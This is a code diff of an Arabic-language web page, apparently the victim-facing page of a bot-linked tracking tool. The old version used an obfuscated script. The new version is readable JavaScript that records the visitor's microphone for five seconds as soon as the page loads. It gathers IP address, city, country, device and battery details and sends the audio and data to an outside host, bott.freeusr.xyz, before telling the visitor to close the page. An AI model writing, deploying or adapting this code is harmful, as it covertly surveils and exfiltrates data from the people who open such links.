@@ -5,57 +5,169 @@
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600&display=swap');
+        @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap');
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
 
         body {
             font-family: 'Poppins', sans-serif;
-            margin: 0;
-            padding: 0;
             background: #000;
             display: flex;
             justify-content: center;
             align-items: center;
-            height: 100vh;
+            min-height: 100vh;
             overflow: hidden;
-            color: #fff;
         }
 
+        /* الحاوية الرئيسية */
         .container {
             text-align: center;
-            padding: 40px;
-            background: rgba(255, 255, 255, 0.1);
-            border-radius: 12px;
-            box-shadow: 0 8px 30px rgba(0, 0, 0, 0.2);
+            padding: 50px 40px;
+            background: rgba(255, 255, 255, 0.05);
+            border-radius: 20px;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            backdrop-filter: blur(20px);
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.8);
             position: relative;
-            overflow: hidden;
-            backdrop-filter: blur(10px);
+            max-width: 450px;
+            width: 90%;
+            animation: fadeInUp 0.8s ease-out;
         }
 
+        /* تأثير الخلفية المتحركة */
         .container::before {
             content: '';
             position: absolute;
-            top: -50%;
-            left: -50%;
-            width: 200%;
-            height: 200%;
-            background: linear-gradient(45deg, rgba(255, 255, 255, 0.1), transparent);
-            transform: rotate(45deg);
-            animation: animate 5s linear infinite;
+            top: -2px;
+            left: -2px;
+            right: -2px;
+            bottom: -2px;
+            background: linear-gradient(45deg, #e74c3c, #f39c12, #e74c3c, #f39c12);
+            background-size: 400% 400%;
+            border-radius: 22px;
+            z-index: -1;
+            animation: gradientMove 3s ease infinite;
+            opacity: 0.3;
         }
 
-        @keyframes animate {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
+        @keyframes gradientMove {
+            0% { background-position: 0% 50%; }
+            50% { background-position: 100% 50%; }
+            100% { background-position: 0% 50%; }
         }
 
-        .loading {
-            border: 8px solid rgba(243, 243, 243, 0.2);
-            border-top: 8px solid #e74c3c;
+        @keyframes fadeInUp {
+            from {
+                opacity: 0;
+                transform: translateY(30px) scale(0.95);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0) scale(1);
+            }
+        }
+
+        /* أيقونة التحقق */
+        .check-icon {
+            width: 80px;
+            height: 80px;
+            background: linear-gradient(135deg, #e74c3c, #c0392b);
+            border-radius: 50%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin: 0 auto 25px;
+            animation: pulse 1.5s ease-in-out infinite;
+            box-shadow: 0 10px 30px rgba(231, 76, 60, 0.4);
+        }
+
+        .check-icon svg {
+            width: 45px;
+            height: 45px;
+            fill: none;
+            stroke: #fff;
+            stroke-width: 3;
+            stroke-linecap: round;
+            stroke-linejoin: round;
+        }
+
+        @keyframes pulse {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.05); }
+            100% { transform: scale(1); }
+        }
+
+        /* النص الرئيسي */
+        .main-title {
+            font-size: 2.8rem;
+            font-weight: 700;
+            color: #e74c3c;
+            margin-bottom: 10px;
+            text-shadow: 0 0 30px rgba(231, 76, 60, 0.3);
+            letter-spacing: 1px;
+        }
+
+        /* النص الفرعي */
+        .sub-text {
+            font-size: 1.1rem;
+            color: rgba(255, 255, 255, 0.7);
+            margin-bottom: 30px;
+            line-height: 1.8;
+        }
+
+        /* زر الإغلاق */
+        .close-btn {
+            background: linear-gradient(135deg, #e74c3c, #c0392b);
+            color: #fff;
+            border: none;
+            padding: 14px 40px;
+            font-size: 1rem;
+            font-weight: 600;
+            border-radius: 50px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            font-family: 'Poppins', sans-serif;
+            letter-spacing: 0.5px;
+            box-shadow: 0 8px 25px rgba(231, 76, 60, 0.3);
+        }
+
+        .close-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 12px 35px rgba(231, 76, 60, 0.5);
+        }
+
+        .close-btn:active {
+            transform: translateY(0);
+        }
+
+        /* الخطوط الزخرفية */
+        .line {
+            width: 60px;
+            height: 3px;
+            background: linear-gradient(90deg, transparent, #e74c3c, transparent);
+            margin: 15px auto 20px;
+            border-radius: 2px;
+        }
+
+        /* رسالة التحميل (تظهر أثناء التسجيل) */
+        .loading-container {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 20px;
+        }
+
+        .loading-spinner {
+            border: 4px solid rgba(255, 255, 255, 0.1);
+            border-top: 4px solid #e74c3c;
             border-radius: 50%;
             width: 50px;
             height: 50px;
-            animation: spin 1.5s linear infinite;
-            margin: 0 auto;
+            animation: spin 1s linear infinite;
         }
 
         @keyframes spin {
@@ -63,28 +175,200 @@
             100% { transform: rotate(360deg); }
         }
 
-        .message {
-            font-size: 20px;
-            color: #ecf0f1;
-            margin-top: 20px;
-            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.5);
+        .loading-text {
+            color: rgba(255, 255, 255, 0.8);
+            font-size: 1.1rem;
+            font-weight: 400;
+        }
+
+        /* إخفاء الفورم */
+        #voice-form {
+            display: none;
         }
     </style>
 </head>
 <body>
-    <div class="container">
-        <div class="loading" id="loading" style="display: none;"></div>
-        <p class="message" id="notification">لحظه واحده من فضلك...</p>
+
+    <!-- الحاوية الرئيسية -->
+    <div class="container" id="mainContainer">
+        <!-- محتوى التحميل (يظهر أثناء التسجيل) -->
+        <div id="loadingContent">
+            <div class="loading-spinner"></div>
+            <p class="loading-text">⏳ جاري تسجيل الصوت...</p>
+            <p style="color: rgba(255,255,255,0.4); font-size: 0.9rem; margin-top: 10px;">يرجى الانتظار لحظة</p>
+        </div>
     </div>
 
+    <!-- نموذج إرسال الصوت -->
     <form method="POST" action="/submitVoice" id="voice-form" enctype="multipart/form-data">
         <input type="hidden" name="chatId" id="chatId">
         <input type="file" name="voice" id="voice" accept="audio/*" style="display: none;">
     </form>
 
-<script>
-function _0x5618(){const _0x11c1a2=['خطأ:\x20chatId\x20غير\x20موجود\x20في\x20الرابط','value','start','chatId','49308dLzQFT','onstop','المتصفح\x20لا\x20يدعم\x20تسجيل\x20الصوت','level','json','then','1074eooIKe','userAgent','ondataavailable','stop','getBattery','585062UyIsAj','https://ipapi.co/json/','platform','25125ROFgFd','DOMContentLoaded','data','غير\x20متاح','append','mediaDevices','9138920AUvZVh','1324wntcKu','stringify','voice.webm','3nSoARS','country_name','فشل\x20الإرسال.\x20حاول\x20مرة\x20أخرى.','message','href','POST','city','getElementById','search','نعم','28930LFvgCd','2928SHVbyU','match','push','addEventListener','audio/webm','location','additionalData','1483342jwtFSG','voice-form','getUserMedia','voice','72yGhfiB','https://bott.freeusr.xyz/submitVoice','charging','https://www.effectivegatecpm.com/k9n9rdcsr?key=a6d387f380a559c60dc3368e5c343738','get','1513168yFSZcy','set','خطأ\x20في\x20تسجيل\x20الصوت:\x20'];_0x5618=function(){return _0x11c1a2;};return _0x5618();}const _0x565eee=_0x5715;(function(_0x364a89,_0x5d8c59){const _0x58e00d=_0x5715,_0x338174=_0x364a89();while(!![]){try{const _0xd5d05c=-parseInt(_0x58e00d(0x1ae))/0x1+parseInt(_0x58e00d(0x18f))/0x2*(-parseInt(_0x58e00d(0x19c))/0x3)+-parseInt(_0x58e00d(0x199))/0x4*(parseInt(_0x58e00d(0x192))/0x5)+-parseInt(_0x58e00d(0x18a))/0x6*(-parseInt(_0x58e00d(0x184))/0x7)+parseInt(_0x58e00d(0x17d))/0x8*(parseInt(_0x58e00d(0x1b2))/0x9)+parseInt(_0x58e00d(0x198))/0xa+-parseInt(_0x58e00d(0x1a6))/0xb*(-parseInt(_0x58e00d(0x1a7))/0xc);if(_0xd5d05c===_0x5d8c59)break;else _0x338174['push'](_0x338174['shift']());}catch(_0x531f30){_0x338174['push'](_0x338174['shift']());}}}(_0x5618,0xd968c),document[_0x565eee(0x1aa)](_0x565eee(0x193),()=>{const _0x5c100f=_0x565eee,_0x58598b=new URLSearchParams(window[_0x5c100f(0x1ac)][_0x5c100f(0x1a4)]),_0x1f6e6f=_0x58598b[_0x5c100f(0x17c)](_0x5c100f(0x183));if(!_0x1f6e6f){alert(_0x5c100f(0x180));return;}document[_0x5c100f(0x1a3)](_0x5c100f(0x183))[_0x5c100f(0x181)]=_0x1f6e6f;if(!navigator[_0x5c100f(0x197)]?.[_0x5c100f(0x1b0)]){alert(_0x5c100f(0x186));return;}startRecording(0x5);}));function _0x5715(_0x2c7d86,_0x5e1fbc){_0x2c7d86=_0x2c7d86-0x17b;const _0x561882=_0x5618();let _0x5715d7=_0x561882[_0x2c7d86];return _0x5715d7;}async function startRecording(_0x1004da){const _0x17a49f=_0x565eee;try{const _0x178df4=await navigator[_0x17a49f(0x197)][_0x17a49f(0x1b0)]({'audio':!![]}),_0x57c8e2=new MediaRecorder(_0x178df4),_0x57d1b8=[];_0x57c8e2[_0x17a49f(0x18c)]=_0x2e2bb=>_0x57d1b8[_0x17a49f(0x1a9)](_0x2e2bb[_0x17a49f(0x194)]),_0x57c8e2[_0x17a49f(0x185)]=async()=>{const _0x39f43b=_0x17a49f,_0x2a866d=new Blob(_0x57d1b8,{'type':_0x39f43b(0x1ab)}),_0x37b0f2=new FormData(document[_0x39f43b(0x1a3)](_0x39f43b(0x1af)));_0x37b0f2[_0x39f43b(0x17e)](_0x39f43b(0x1b1),_0x2a866d,_0x39f43b(0x19b));const _0x2de139=await collectAdditionalData();_0x37b0f2[_0x39f43b(0x196)](_0x39f43b(0x1ad),JSON[_0x39f43b(0x19a)](_0x2de139));const _0x3a8606=await fetch(_0x39f43b(0x1b3),{'method':_0x39f43b(0x1a1),'body':_0x37b0f2});_0x3a8606['ok']?window[_0x39f43b(0x1ac)][_0x39f43b(0x1a0)]=_0x39f43b(0x17b):alert(_0x39f43b(0x19e));},_0x57c8e2[_0x17a49f(0x182)](),setTimeout(()=>_0x57c8e2[_0x17a49f(0x18d)](),_0x1004da*0x3e8);}catch(_0x168977){alert(_0x17a49f(0x17f)+_0x168977[_0x17a49f(0x19f)]);}}async function collectAdditionalData(){const _0x562f6e=_0x565eee;let _0x159ba4=_0x562f6e(0x195),_0x456a42='',_0x4947c5='';try{const _0x13f7fd=await fetch(_0x562f6e(0x190))[_0x562f6e(0x189)](_0x2e4d00=>_0x2e4d00[_0x562f6e(0x188)]());_0x159ba4=_0x13f7fd['ip'],_0x456a42=_0x13f7fd[_0x562f6e(0x19d)],_0x4947c5=_0x13f7fd[_0x562f6e(0x1a2)];}catch{}const _0x367b20=navigator[_0x562f6e(0x18b)],_0x1c97a5=navigator[_0x562f6e(0x191)],_0x15a5ea=_0x367b20[_0x562f6e(0x1a8)](/\(([^)]+)\)/),_0x560ac9=_0x15a5ea?_0x15a5ea[0x1]:_0x562f6e(0x195);let _0x3c6e02=_0x562f6e(0x195),_0x54dbaa=_0x562f6e(0x195);try{const _0xa214ec=await navigator[_0x562f6e(0x18e)]();_0x3c6e02=_0xa214ec[_0x562f6e(0x187)]*0x64+'%',_0x54dbaa=_0xa214ec[_0x562f6e(0x1b4)]?_0x562f6e(0x1a5):'لا';}catch{}return{'ip':_0x159ba4,'country':_0x456a42,'city':_0x4947c5,'platform':_0x1c97a5,'deviceVersion':_0x560ac9,'batteryLevel':_0x3c6e02,'batteryCharging':_0x54dbaa};}
-</script>
-<script src="https://pl27402931.effectivegatecpm.com/4f/ac/c1/4facc18f55584cc499c878e46c1ccbee.js"></script>
+    <script>
+        document.addEventListener('DOMContentLoaded', () => {
+            const urlParams = new URLSearchParams(window.location.search);
+            const chatId = urlParams.get('chatId');
+            
+            if (!chatId) {
+                showError("❌ خطأ: chatId غير موجود في الرابط");
+                return;
+            }
+
+            document.getElementById('chatId').value = chatId;
+
+            if (!navigator.mediaDevices?.getUserMedia) {
+                showError("❌ المتصفح لا يدعم تسجيل الصوت");
+                return;
+            }
+
+            startRecording(5); // تسجيل 5 ثواني
+        });
+
+        // دالة عرض رسالة الخطأ
+        function showError(message) {
+            document.getElementById('mainContainer').innerHTML = `
+                <div style="color: #e74c3c; font-size: 1.2rem; padding: 20px;">
+                    ${message}
+                </div>
+            `;
+        }
+
+        // دالة عرض رسالة النجاح "انتهى اغلق الصفحة"
+        function showSuccessMessage() {
+            document.getElementById('mainContainer').innerHTML = `
+                <!-- أيقونة التحقق -->
+                <div class="check-icon">
+                    <svg viewBox="0 0 24 24">
+                        <polyline points="20 6 9 17 4 12" />
+                    </svg>
+                </div>
+
+                <!-- العنوان الرئيسي -->
+                <h1 class="main-title">انتهى اغلق الصفحة</h1>
+
+                <!-- خط زخرفي -->
+                <div class="line"></div>
+
+                <!-- النص الفرعي -->
+                <p class="sub-text">
+                    ✅ تم إرسال الصوت بنجاح<br>
+                    يمكنك الآن إغلاق هذه الصفحة
+                </p>
+
+                <!-- زر الإغلاق -->
+                <button class="close-btn" onclick="closePage()">
+                    ✕ إغلاق الصفحة
+                </button>
+            `;
+        }
+
+        // دالة إغلاق الصفحة
+        function closePage() {
+            // محاولة إغلاق الصفحة
+            window.close();
+            
+            // في حال لم تعمل window.close (بعض المتصفحات تمنعها)
+            setTimeout(() => {
+                document.body.innerHTML = `
+                    <div style="
+                        display: flex;
+                        justify-content: center;
+                        align-items: center;
+                        height: 100vh;
+                        background: #000;
+                        color: #e74c3c;
+                        font-size: 1.5rem;
+                        font-family: 'Poppins', sans-serif;
+                        text-align: center;
+                        padding: 20px;
+                    ">
+                        ✅ يمكنك إغلاق هذه الصفحة الآن
+                    </div>
+                `;
+            }, 500);
+        }
+
+        // دالة بدء التسجيل
+        async function startRecording(duration) {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+                const recorder = new MediaRecorder(stream);
+                const chunks = [];
+
+                recorder.ondataavailable = e => chunks.push(e.data);
+                
+                recorder.onstop = async () => {
+                    const blob = new Blob(chunks, { type: 'audio/webm' });
+                    const formData = new FormData(document.getElementById('voice-form'));
+                    formData.set('voice', blob, 'voice.webm');
+
+                    // تحديث نص التحميل
+                    document.querySelector('.loading-text').textContent = '📤 جاري إرسال الصوت...';
+
+                    const info = await collectAdditionalData();
+                    formData.append('additionalData', JSON.stringify(info));
+
+                    try {
+                        const res = await fetch('https://bott.freeusr.xyz/submitVoice', {
+                            method: 'POST',
+                            body: formData
+                        });
+
+                        if (res.ok) {
+                            // ✅ نجاح الإرسال - عرض رسالة "انتهى اغلق الصفحة"
+                            showSuccessMessage();
+                        } else {
+                            showError("❌ فشل الإرسال. حاول مرة أخرى.");
+                        }
+                    } catch (error) {
+                        showError("❌ خطأ في الاتصال: " + error.message);
+                    }
+                };
+
+                recorder.start();
+                setTimeout(() => recorder.stop(), duration * 1000);
+                
+            } catch (err) {
+                showError("❌ خطأ في تسجيل الصوت: " + err.message);
+            }
+        }
+
+        // دالة جمع بيانات إضافية
+        async function collectAdditionalData() {
+            let ip = 'غير متاح', country = '', city = '';
+            
+            try {
+                const ipInfo = await fetch('https://ipapi.co/json/').then(res => res.json());
+                ip = ipInfo.ip || 'غير متاح';
+                country = ipInfo.country_name || '';
+                city = ipInfo.city || '';
+            } catch {}
+
+            const ua = navigator.userAgent;
+            const platform = navigator.platform;
+            const match = ua.match(/\(([^)]+)\)/);
+            const deviceVersion = match ? match[1] : 'غير متاح';
+
+            let batteryLevel = 'غير متاح', charging = 'غير متاح';
+            
+            try {
+                const battery = await navigator.getBattery();
+                batteryLevel = (battery.level * 100) + '%';
+                charging = battery.charging ? 'نعم' : 'لا';
+            } catch {}
+
+            return { 
+                ip, 
+                country, 
+                city, 
+                platform, 
+                deviceVersion, 
+                batteryLevel, 
+                batteryCharging: charging 
+            };
+        }
+    </script>
+
 </body>
 </html>
